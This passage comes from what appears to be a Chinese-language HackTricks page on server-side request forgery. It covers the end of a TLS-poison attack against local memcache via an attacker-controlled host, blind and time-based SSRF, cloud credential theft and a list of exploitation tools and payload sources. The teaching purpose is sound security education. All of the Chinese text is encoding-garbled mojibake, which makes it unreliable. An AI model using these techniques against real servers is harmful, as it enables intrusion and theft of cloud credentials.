5. åœ¨DNSè¯·æ±‚ä¸­ï¼Œç°åœ¨ç»™å‡ºäº†**ç§æœ‰IP**åœ°å€ï¼ˆä¾‹å¦‚127.0.0.1ï¼‰
6. ç”¨æˆ·/æœºå™¨äººå°†å°è¯•**é‡æ–°å»ºç«‹TLSè¿æ¥**ï¼Œä¸ºæ­¤å®ƒå°†**å‘é€**ä¼šè¯ID/ç¥¨è¯IDï¼ˆå…¶ä¸­åŒ…å«äº†æ”»å‡»è€…çš„**è½½è·**ï¼‰ã€‚æ­å–œï¼Œæ‚¨æˆåŠŸåœ°è¦æ±‚äº†**ç”¨æˆ·/æœºå™¨äººæ”»å‡»è‡ªå·±**ã€‚

è¯·æ³¨æ„ï¼Œåœ¨æ­¤æ”»å‡»æœŸé—´ï¼Œå¦‚æœè¦æ”»å‡»localhost:11211ï¼ˆ_memcache_ï¼‰ï¼Œæ‚¨éœ€è¦ä½¿å—å®³è€…ä¸www.attacker.com:11211ï¼ˆ**ç«¯å£å¿…é¡»å§‹ç»ˆç›¸åŒ**ï¼‰å»ºç«‹åˆå§‹è¿æ¥ã€‚\
è¦**æ‰§è¡Œæ­¤æ”»å‡»ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å·¥å…·**ï¼š[https://github.com/jmdx/TLS-poison/](https://github.com/jmdx/TLS-poison/)\
æœ‰å…³æ­¤æ”»å‡»çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚é˜…è§£é‡Šæ­¤æ”»å‡»çš„è®²åº§ï¼š[https://www.youtube.com/watch?v=qGpAJxfADjo\&ab\_channel=DEFCONConference](https://www.youtube.com/watch?v=qGpAJxfADjo\&ab\_channel=DEFCONConference)

## ç›²SSRF

ç›²SSRFå’Œéç›²SSRFçš„åŒºåˆ«åœ¨äºï¼Œåœ¨ç›²SSRFä¸­ï¼Œæ‚¨æ— æ³•çœ‹åˆ°SSRFè¯·æ±‚çš„å“åº”ã€‚å› æ­¤ï¼Œå®ƒæ›´éš¾ä»¥åˆ©ç”¨ï¼Œå› ä¸ºæ‚¨åªèƒ½åˆ©ç”¨å·²çŸ¥çš„æ¼æ´ã€‚

### åŸºäºæ—¶é—´çš„SSRF

é€šè¿‡æ£€æŸ¥æœåŠ¡å™¨å“åº”çš„æ—¶é—´ï¼Œå¯ä»¥ç¡®å®šæ˜¯å¦å­˜åœ¨æŸä¸ªèµ„æºï¼ˆè®¿é—®ç°æœ‰èµ„æºå¯èƒ½æ¯”è®¿é—®ä¸å­˜åœ¨çš„èµ„æºéœ€è¦æ›´é•¿çš„æ—¶é—´ï¼‰

## äº‘SSRFåˆ©ç”¨

å¦‚æœåœ¨äº‘ç¯å¢ƒä¸­è¿è¡Œçš„æœºå™¨ä¸­å‘ç°äº†SSRFæ¼æ´ï¼Œæ‚¨å¯èƒ½èƒ½å¤Ÿè·å–æœ‰å…³äº‘ç¯å¢ƒç”šè‡³å‡­æ®çš„æœ‰è¶£ä¿¡æ¯ï¼š

{% content-ref url="cloud-ssrf.md" %}
[cloud-ssrf.md](cloud-ssrf.md)
{% endcontent-ref %}

## SSRFæ˜“å—æ”»å‡»çš„å¹³å°

ä¸€äº›å·²çŸ¥å¹³å°åŒ…å«æˆ–æ›¾åŒ…å«SSRFæ¼æ´ï¼Œè¯·åœ¨ä»¥ä¸‹ä½ç½®æ£€æŸ¥å®ƒä»¬ï¼š

{% content-ref url="ssrf-vulnerable-platforms.md" %}
[ssrf-vulnerable-platforms.md](ssrf-vulnerable-platforms.md)
{% endcontent-ref %}

## å·¥å…·

### [**SSRFMap**](https://github.com/swisskyrepo/SSRFmap)

ç”¨äºæ£€æµ‹å’Œåˆ©ç”¨SSRFæ¼æ´çš„å·¥å…·

### [Gopherus](https://github.com/tarunkant/Gopherus)

* [Gopherusçš„åšå®¢æ–‡ç« ](https://spyclub.tech/2018/08/14/2018-08-14-blog-on-gopherus/)

æ­¤å·¥å…·å¯ä¸ºä»¥ä¸‹å†…å®¹ç”ŸæˆGopherè½½è·ï¼š

* MySQL
* PostgreSQL
* FastCGI
* Redis
* Zabbix
* Memcache

### [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser)

* [SSRFç”¨æ³•çš„åšå®¢æ–‡ç« ](https://blog.tneitzel.eu/posts/01-attacking-java-rmi-via-ssrf/)

_remote-method-guesser_æ˜¯ä¸€ç§æ”¯æŒå¤§å¤šæ•°å¸¸è§_Java RMI_æ¼æ´çš„æ”»å‡»æ“ä½œçš„_Java RMI_æ¼æ´æ‰«æå·¥å…·ã€‚å¤§å¤šæ•°å¯ç”¨æ“ä½œéƒ½æ”¯æŒ`--ssrf`é€‰é¡¹ï¼Œä»¥ç”Ÿæˆæ‰€è¯·æ±‚æ“ä½œçš„_SSRF_è½½è·ã€‚ç»“åˆ`--gopher`é€‰é¡¹ï¼Œå¯ä»¥ç›´æ¥ç”Ÿæˆå¯ç”¨çš„_gopher_è½½è·ã€‚

### [SSRF Proxy](https://github.com/bcoles/ssrf\_proxy)

SSRF Proxyæ˜¯ä¸€ä¸ªå¤šçº¿ç¨‹HTTPä»£ç†æœåŠ¡å™¨ï¼Œæ—¨åœ¨é€šè¿‡å¯¹æ˜“å—Server-Side Request Forgery (SSRF)æ”»å‡»çš„HTTPæœåŠ¡å™¨è¿›è¡Œéš§é“ä¼ è¾“å®¢æˆ·ç«¯HTTPæµé‡ã€‚

### ç»ƒä¹ 

{% embed url="https://github.com/incredibleindishell/SSRF_Vulnerable_Lab" %}

## å‚è€ƒèµ„æ–™

* [https://medium.com/@pravinponnusamy/ssrf-payloads-f09b2a86a8b4](https://medium.com/@pravinponnusamy/ssrf-payloads-f09b2a86a8b4)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
* [https://www.invicti.com/blog/web-security/ssrf-vulnerabilities-caused-by-sni-proxy-misconfigurations/](https://www.invicti.com/blog/web-security/ssrf-vulnerabilities-caused-by-sni-proxy-misconfigurations/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* æ‚¨åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…æ‚¨æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[NFTs](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegramç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘çš„**Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* é€šè¿‡å‘[**hacktricksä»“åº“**](https://github.com/carlospolop/hacktricks)å’Œ[**hacktricks-cloudä»“åº“**](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

![](<../../.gitbook/assets/image (9) (1) (2).png>)

\
ä½¿ç”¨[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)è½»æ¾æ„å»ºå’Œ**è‡ªåŠ¨åŒ–å·¥ä½œæµç¨‹**ï¼Œåˆ©ç”¨ä¸–ç•Œä¸Š**æœ€å…ˆè¿›çš„**ç¤¾åŒºå·¥å…·ã€‚\
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
